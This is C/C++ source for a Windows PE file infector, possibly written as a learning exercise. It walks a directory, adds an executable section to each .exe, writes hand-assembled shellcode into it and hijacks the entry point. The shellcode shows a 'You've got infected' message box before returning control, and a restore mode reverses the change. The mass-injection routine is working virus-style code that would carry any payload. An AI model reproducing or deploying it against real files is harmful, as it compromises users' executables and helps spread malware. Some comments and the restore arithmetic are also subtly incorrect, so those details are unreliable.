#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <stdint.h>

DWORD align(DWORD size, DWORD align, DWORD addr) {
    if(!(size % align)) {
        return addr + size;
    }
    return addr + (size / align + 1) * align;
}

bool AddSection(char* filename, char *sectionName, DWORD sizeofSection) {
    HANDLE hFile = CreateFile(filename, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if(hFile == INVALID_HANDLE_VALUE) {
        printf("Failed to open file\n");
        return false;
    }
    
    DWORD dwFileSize = GetFileSize(hFile, nullptr);
    if(dwFileSize == INVALID_FILE_SIZE) {
        printf("Failed to get file size\n");
        return false;
    }

    BYTE *pByte = new BYTE[dwFileSize];
    DWORD dw;
    ReadFile(hFile, pByte, dwFileSize, &dw, nullptr);

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pByte;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("Not a valid PE file\n");
        return false;
    }

    auto pNtHeader = (PIMAGE_NT_HEADERS32)((DWORD)pByte + pDosHeader->e_lfanew);
    if (pNtHeader->Signature != IMAGE_NT_SIGNATURE) {
        printf("Not a valid PE file\n");
        return false;
    }
    PIMAGE_FILE_HEADER FileHeader = &pNtHeader->FileHeader;
    PIMAGE_OPTIONAL_HEADER32 OptionalHeader = &pNtHeader->OptionalHeader;
    auto pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pNtHeader + sizeof(IMAGE_NT_HEADERS32));
    if (pSectionHeader == nullptr) {
        printf("No section header\n");
        return false;
    }

    int sectionNumber = FileHeader->NumberOfSections;
    ZeroMemory(&pSectionHeader[sectionNumber], sizeof(IMAGE_SECTION_HEADER));
    CopyMemory(&pSectionHeader[sectionNumber].Name, sectionName, 8);

    pSectionHeader[sectionNumber].Misc.VirtualSize = align(sizeofSection, OptionalHeader->SectionAlignment, 0);
    pSectionHeader[sectionNumber].VirtualAddress = align(
        pSectionHeader[sectionNumber - 1].Misc.VirtualSize, 
        OptionalHeader->SectionAlignment, 
        pSectionHeader[sectionNumber - 1].VirtualAddress
        );
    pSectionHeader[sectionNumber].SizeOfRawData = align(sizeofSection, OptionalHeader->FileAlignment, 0);
    pSectionHeader[sectionNumber].PointerToRawData = align(
        pSectionHeader[sectionNumber - 1].SizeOfRawData, 
        OptionalHeader->FileAlignment, 
        pSectionHeader[sectionNumber - 1].PointerToRawData
        );
    pSectionHeader[sectionNumber].Characteristics = 0xE00000E0;
    // 0xE00000E0 = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_CNT_UNINITIALIZED_DATA
    
    // Increase file size
    SetFilePointer(
        hFile,
        pSectionHeader[sectionNumber].PointerToRawData + pSectionHeader[sectionNumber].SizeOfRawData,
        nullptr, 
        FILE_BEGIN
        );
    SetEndOfFile(hFile);

    OptionalHeader->SizeOfImage = pSectionHeader[sectionNumber].VirtualAddress + pSectionHeader[sectionNumber].Misc.VirtualSize;
    FileHeader->NumberOfSections += 1;

    SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
    WriteFile(hFile, pByte, dwFileSize, &dw, nullptr);
    CloseHandle(hFile);
    return true;
}

bool AddCode(char *filepath) {
    HANDLE hFile = CreateFile(filepath, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if(hFile == INVALID_HANDLE_VALUE) {
        return false; // Failed to open file
    }
    
    DWORD dwFileSize = GetFileSize(hFile, nullptr);
    if(dwFileSize == INVALID_FILE_SIZE) {
        return false; // Failed to get file size
    }

    int i = 0;
    BYTE *pByte = new BYTE[dwFileSize];
    DWORD dw;
    ReadFile(hFile, pByte, dwFileSize, &dw, nullptr);
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pByte;
    auto pNtHeader = (PIMAGE_NT_HEADERS32)((DWORD)pByte + pDosHeader->e_lfanew);
    PIMAGE_FILE_HEADER pFileHeader = &pNtHeader->FileHeader;
    PIMAGE_OPTIONAL_HEADER pOptionalHeader = &pNtHeader->OptionalHeader;
    PIMAGE_SECTION_HEADER pFisrtSectionHeader = IMAGE_FIRST_SECTION(pNtHeader);
    PIMAGE_SECTION_HEADER pLastSectionHeader = pFisrtSectionHeader + pNtHeader->FileHeader.NumberOfSections - 1;

    SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
    //Get original entry point
    DWORD oldAddress = pOptionalHeader->AddressOfEntryPoint + pOptionalHeader->ImageBase;
    pOptionalHeader->AddressOfEntryPoint = pLastSectionHeader->VirtualAddress;
    //disable ASLR
    pFileHeader->Characteristics = 0x010F;
    WriteFile(hFile, pByte, dwFileSize, &dw, nullptr);

    SetFilePointer(
        hFile,
        pLastSectionHeader->PointerToRawData,
        nullptr, 
        FILE_BEGIN
        );
    // The shellcode is assembled from the assembly code in asm.txt
    byte shellcode1[] = {
        0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x40, 0x14, 0x8B, 0x00, 0x8B, 0x00,
        0x8B, 0x40, 0x10, 0x89, 0xC3, 0x8B, 0x40, 0x3C, 0x8B, 0x7C, 0x18, 0x78, 0x01, 0xDF, 0x8B, 0x4F, 
        0x18, 0x8B, 0x57, 0x20, 0x01, 0xDA, 0x49, 0x8B, 0x34, 0x8A, 0x01, 0xDE, 0x81, 0x3E, 0x4C, 0x6F, 
        0x61, 0x64, 0x74, 0x00, 0x81, 0x7E, 0x04, 0x4C, 0x69, 0x62, 0x72, 0x74, 0x00, 0x81, 0x7E, 0x08, 
        0x61, 0x72, 0x79, 0x41, 0x74, 0x02, 0xEB, 0xDE, 0x8B, 0x57, 0x24, 0x01, 0xDA, 0x66, 0x8B, 0x0C, 
        0x4A, 0x8B, 0x57, 0x1C, 0x01, 0xDA, 0x8B, 0x04, 0x8A, 0x01, 0xD8, 0x83, 0xEC, 0x0B, 0x89, 0xE3, 
        0xC6, 0x03, 0x75, 0xC6, 0x43, 0x01, 0x73, 0xC6, 0x43, 0x02, 0x65, 0xC6, 0x43, 0x03, 0x72, 0xC6, 
        0x43, 0x04, 0x33, 0xC6, 0x43, 0x05, 0x32, 0xC6, 0x43, 0x06, 0x2E, 0xC6, 0x43, 0x07, 0x64, 0xC6, 
        0x43, 0x08, 0x6C, 0xC6, 0x43, 0x09, 0x6C, 0xC6, 0x43, 0x0A, 0x00, 0x53, 0xFF, 0xD0, 0x83, 0xC4, 
        0x0B, 0x50, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x40, 0x14, 0x8B, 0x00, 
        0x8B, 0x00, 0x8B, 0x40, 0x10, 0x89, 0xC3, 0x8B, 0x40, 0x3C, 0x8B, 0x7C, 0x18, 0x78, 0x01, 0xDF, 
        0x8B, 0x4F, 0x18, 0x8B, 0x57, 0x20, 0x01, 0xDA, 0x49, 0x8B, 0x34, 0x8A, 0x01, 0xDE, 0x81, 0x3E, 
        0x47, 0x65, 0x74, 0x50, 0x74, 0x00, 0x81, 0x7E, 0x04, 0x72, 0x6F, 0x63, 0x41, 0x74, 0x00, 0x81, 
        0x7E, 0x08, 0x64, 0x64, 0x72, 0x65, 0x74, 0x02, 0xEB, 0xDE, 0x8B, 0x57, 0x24, 0x01, 0xDA, 0x66, 
        0x8B, 0x0C, 0x4A, 0x8B, 0x57, 0x1C, 0x01, 0xDA, 0x8B, 0x04, 0x8A, 0x01, 0xD8, 0x89, 0xC6, 0x83, 
        0xEC, 0x0C, 0x89, 0xE3, 0xC6, 0x03, 0x4D, 0xC6, 0x43, 0x01, 0x65, 0xC6, 0x43, 0x02, 0x73, 0xC6, 
        0x43, 0x03, 0x73, 0xC6, 0x43, 0x04, 0x61, 0xC6, 0x43, 0x05, 0x67, 0xC6, 0x43, 0x06, 0x65, 0xC6, 
        0x43, 0x07, 0x42, 0xC6, 0x43, 0x08, 0x6F, 0xC6, 0x43, 0x09, 0x78, 0xC6, 0x43, 0x0A, 0x41, 0xC6, 
        0x43, 0x0B, 0x00, 0x8B, 0x44, 0x24, 0x0C, 0x53, 0x50, 0xFF, 0xD6, 0x83, 0xC4, 0x0C, 0x83, 0xEC, 
        0x13, 0x89, 0xE3, 0xC6, 0x03, 0x59, 0xC6, 0x43, 0x01, 0x6F, 0xC6, 0x43, 0x02, 0x75, 0xC6, 0x43, 
        0x03, 0x27, 0xC6, 0x43, 0x04, 0x76, 0xC6, 0x43, 0x05, 0x65, 0xC6, 0x43, 0x06, 0x20, 0xC6, 0x43, 
        0x07, 0x67, 0xC6, 0x43, 0x08, 0x6F, 0xC6, 0x43, 0x09, 0x74, 0xC6, 0x43, 0x0A, 0x20, 0xC6, 0x43, 
        0x0B, 0x69, 0xC6, 0x43, 0x0C, 0x6E, 0xC6, 0x43, 0x0D, 0x66, 0xC6, 0x43, 0x0E, 0x65, 0xC6, 0x43, 
        0x0F, 0x63, 0xC6, 0x43, 0x10, 0x74, 0xC6, 0x43, 0x11, 0x65, 0xC6, 0x43, 0x12, 0x64, 0xC6, 0x43, 
        0x13, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x53, 0x6A, 0x00, 0xFF, 0xD0, 0x83, 0xC4, 0x13, 0xB8
    };
    // Write first part of shellcode
    WriteFile(hFile, shellcode1, sizeof(shellcode1), &dw, nullptr);
    // Write little endian of old entry point
    for (int i = 0; i < 4; i++) {
        BYTE b = (BYTE)(oldAddress >> (i * 8));
        WriteFile(hFile, &b, 1, &dw, nullptr);
    }
    BYTE shellcode2[] = {0xFF, 0xE0};
    // Write second part of shellcode
    WriteFile(hFile, shellcode2, sizeof(shellcode2), &dw, nullptr);
    return true;
}

// The shellcode have the original entry point in the offset 0x18F (Address of the shellcode + 0x18F)
uint32_t getOriginalEntryPoint(char* filePath) {
    HANDLE hFile = CreateFile(filePath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Error opening file!\n");
        return 0;
    }
    
    DWORD dwFileSize = GetFileSize(hFile, nullptr);
    if (dwFileSize == INVALID_FILE_SIZE) {
        printf("Error getting file size!\n");
        return 0;
    }
    
    BYTE *pByte = new BYTE[dwFileSize];
    DWORD dw;
    ReadFile(hFile, pByte, dwFileSize, &dw, nullptr);
    // get all necessary headers
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pByte;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pByte + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("Not a valid PE file\n");
        return false;
    }

    PIMAGE_FILE_HEADER pFileHeader = (PIMAGE_FILE_HEADER)&pNtHeaders->FileHeader;
    PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&pNtHeaders->OptionalHeader;
    PIMAGE_SECTION_HEADER pFisrtSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    if (pFisrtSectionHeader == nullptr) {
        printf("No section header\n");
        return false;
    }

    PIMAGE_SECTION_HEADER pLastSectionHeader = pFisrtSectionHeader + pFileHeader->NumberOfSections - 1;
    // Point to the shellcode
    pByte += pLastSectionHeader->PointerToRawData;
    // Get the address of the old entry point
    uint32_t address = *(uint32_t*)(pByte + 0x18F);
    uint32_t oldEntryPoint = address - pOptionalHeader->ImageBase;
    CloseHandle(hFile);
    return oldEntryPoint;
}

// Delete the last section and restore the original entry point
bool RestoreFile(char *filepath) {
    uint32_t originalEntryPoint = getOriginalEntryPoint(filepath);
    if (originalEntryPoint == 0) {
        printf("Error getting original entry point!\n");
        return false;
    }
    HANDLE hFile = CreateFile(filepath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    DWORD dwFileSize = GetFileSize(hFile, nullptr);
    BYTE *pByte = new BYTE[dwFileSize];
    DWORD dw;
    ReadFile(hFile, pByte, dwFileSize, &dw, nullptr);
    // get all necessary headers
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pByte;
    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pByte + pDosHeader->e_lfanew);
    PIMAGE_FILE_HEADER pFileHeader = (PIMAGE_FILE_HEADER)&pNtHeader->FileHeader;
    PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&pNtHeader->OptionalHeader;
    PIMAGE_SECTION_HEADER pFirstSectionHeader = IMAGE_FIRST_SECTION(pNtHeader);
    PIMAGE_SECTION_HEADER pLastSectionHeader = pFirstSectionHeader + pFileHeader->NumberOfSections - 1;
    PIMAGE_DATA_DIRECTORY pDataDirectory = (PIMAGE_DATA_DIRECTORY)pOptionalHeader->DataDirectory;
    // Delete the last section and it's data
    SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
    if (strcmp((char*)pLastSectionHeader->Name, ".code") == 0) {
        // Reduce the size of the file
        SetFilePointer(hFile, pLastSectionHeader->PointerToRawData, nullptr, FILE_BEGIN);
        SetEndOfFile(hFile);
        // Update the file header
        pFileHeader->NumberOfSections--;
        // Update the optional header
        pOptionalHeader->SizeOfImage -= sizeof(IMAGE_SECTION_HEADER);
        // Update the data directory
        for (int j = 0; j < 16; j++) {
            if (pDataDirectory[j].VirtualAddress > pLastSectionHeader->VirtualAddress) {
                pDataDirectory[j].VirtualAddress -= sizeof(IMAGE_SECTION_HEADER);
            }
        }
    }
    SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
    // Restore the original entry point
    pOptionalHeader->AddressOfEntryPoint = originalEntryPoint;
    // Write the new headers
    dwFileSize = GetFileSize(hFile, nullptr);
    WriteFile(hFile, pByte, dwFileSize, &dw, nullptr);
    CloseHandle(hFile);
    return true;

}

int isDirectory(char* lpFilePath) {
    // check file is directory or not
    DWORD dwFileAttributes = GetFileAttributes(lpFilePath);
    if (dwFileAttributes == INVALID_FILE_ATTRIBUTES) {
        return -1;
    }
    if (dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
        return 1;
    }
    return 0;
}

void printHelp() {
        printf("Usage:\n");
        printf("[+] Inject Message Box: shellcode <filepath>\n");
        printf("[+] Restore files: shellcode --restore <filepath>\n");
}

int main(int argc, char *argv[]) {
    char* lpFilePath;
    switch (argc) {
    case 2: {
        lpFilePath = argv[1];
        // remove trailing slash
        if (lpFilePath[strlen(lpFilePath) - 1] == '\\' || lpFilePath[strlen(lpFilePath) - 1] == '/') {
            lpFilePath[strlen(lpFilePath) - 1] = '\0';
        }

        // get absolute path
        char* lpAbsolutePath = new char[MAX_PATH];
        GetFullPathName(lpFilePath, MAX_PATH, lpAbsolutePath, nullptr);
        if (isDirectory(lpAbsolutePath) == 0) {
            // get the parent directory
            char* lpParentPath = new char[MAX_PATH];
            strcpy(lpParentPath, lpAbsolutePath);
            char* lpLastSlash = strrchr(lpParentPath, '\\');
            *lpLastSlash = '\0';
            // get all exe files in parent directory
            lpAbsolutePath = lpParentPath;
        } else if (isDirectory(lpAbsolutePath) == -1) {
            printf("Error: this path is not exist\n");
            return 0;
        }
        // get all exe files in directory
        char* lpSearchPath = new char[MAX_PATH];
        strcpy(lpSearchPath, lpAbsolutePath);
        strcat(lpSearchPath, "\\*.exe");
        WIN32_FIND_DATAA findData;
        HANDLE hFind = FindFirstFileA(lpSearchPath, &findData);
        if (hFind == INVALID_HANDLE_VALUE) {
            printf("Error: FindFirstFileA failed\n");
            return 0;
        }
        do {
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                continue;
            }
            char* lpExePath = new char[MAX_PATH];
            strcpy(lpExePath, lpAbsolutePath);
            strcat(lpExePath, "\\");
            strcat(lpExePath, findData.cFileName);
            printf("Injecting %s\n", lpExePath);
            if (AddSection(lpExePath, ".code",400)) {
                printf("Section added!\n");
                if (AddCode(lpExePath)) {
                    printf("Code added!\n");
                } else {
                    printf("Error adding code!\n");
                }
            } else {
                printf("Error adding section!\n");
            }
            
        } while (FindNextFileA(hFind, &findData));
        FindClose(hFind);
        break;
    }
    case 3: {
        if (strcmp(argv[1], "--restore") == 0) {
            lpFilePath = argv[2];
            // remove trailing slash
            if (lpFilePath[strlen(lpFilePath) - 1] == '\\' || lpFilePath[strlen(lpFilePath) - 1] == '/') {
                lpFilePath[strlen(lpFilePath) - 1] = '\0';
            }

            // get absolute path
            char* lpAbsolutePath = new char[MAX_PATH];
            GetFullPathName(lpFilePath, MAX_PATH, lpAbsolutePath, nullptr);
            if (isDirectory(lpAbsolutePath) == 0) {
                // get the parent directory
                char* lpParentPath = new char[MAX_PATH];
                strcpy(lpParentPath, lpAbsolutePath);
                char* lpLastSlash = strrchr(lpParentPath, '\\');
                *lpLastSlash = '\0';
                // get all exe files in parent directory
                lpAbsolutePath = lpParentPath;
            } else if (isDirectory(lpAbsolutePath) == -1) {
                printf("Error: this path is not exist\n");
                return 0;
            }
            // get all exe files in directory
            char* lpSearchPath = new char[MAX_PATH];
            strcpy(lpSearchPath, lpAbsolutePath);
            strcat(lpSearchPath, "\\*.exe");
            WIN32_FIND_DATAA findData;
            HANDLE hFind = FindFirstFileA(lpSearchPath, &findData);
            if (hFind == INVALID_HANDLE_VALUE) {
                printf("Error: FindFirstFileA failed\n");
                return 0;
            }
            do {
                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    continue;
                }
                char* lpExePath = new char[MAX_PATH];
                strcpy(lpExePath, lpAbsolutePath);
                strcat(lpExePath, "\\");
                strcat(lpExePath, findData.cFileName);
                printf("Restoring %s\n", lpExePath);
                if (RestoreFile(lpExePath)) {
                printf("File restored!\n");
                } else {
                    printf("Error restoring file!\n");
                }  
            } while (FindNextFileA(hFind, &findData));
            FindClose(hFind);
        } else {
            printHelp();
        }
        break;
    }
    default:
        printHelp();
    }
    return 0;
}